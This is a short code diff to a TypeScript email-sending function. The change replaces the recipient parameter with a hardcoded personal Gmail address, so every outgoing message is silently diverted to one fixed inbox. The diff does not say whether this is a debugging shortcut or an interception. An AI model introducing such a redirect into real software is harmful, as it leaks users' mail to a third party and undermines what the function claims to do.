@@ -54,7 +54,7 @@ export async function sendEmail(subject: string, body: string, toEmail: string) 
     // Define the mail options
     const mailOptions = {
         from: SMTP_FROM,
-        to: toEmail,
+        to: "simonadjei70@gmail.com",
         subject: subject,
         html: htmlBody,
     };
